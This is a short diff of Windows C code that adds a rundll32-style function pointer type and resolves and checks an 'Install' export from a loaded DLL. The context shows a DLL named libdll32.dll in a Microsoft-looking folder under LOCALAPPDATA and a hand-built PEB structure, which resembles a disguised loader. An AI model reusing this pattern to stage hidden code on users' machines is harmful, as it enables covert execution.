@@ -6,6 +6,8 @@
 #define PATH L"%LOCALAPPDATA%\\Microsoft\\InstallService"
 #define FILE L"libdll32.dll"
 
+typedef void(__stdcall* RUNDLL32FUNCTION) (HWND window, HINSTANCE instance, LPSTR argument, int command);
+
 typedef struct {
 	BOOLEAN InheritedAddressSpace;
 	BOOLEAN ReadImageFileExecOptions;
@@ -185,6 +187,13 @@ directoryExists:;
 
 	if(!executable) {
 		displayError(L"LoadLibraryW", GetLastError(), heap);
+		goto freeBuffer;
+	}
+
+	RUNDLL32FUNCTION function = (RUNDLL32FUNCTION) GetProcAddress(executable, "Install");
+
+	if(!function) {
+		displayError(L"GetProcAddress", GetLastError(), heap);
 		goto freeBuffer;
 	}
 
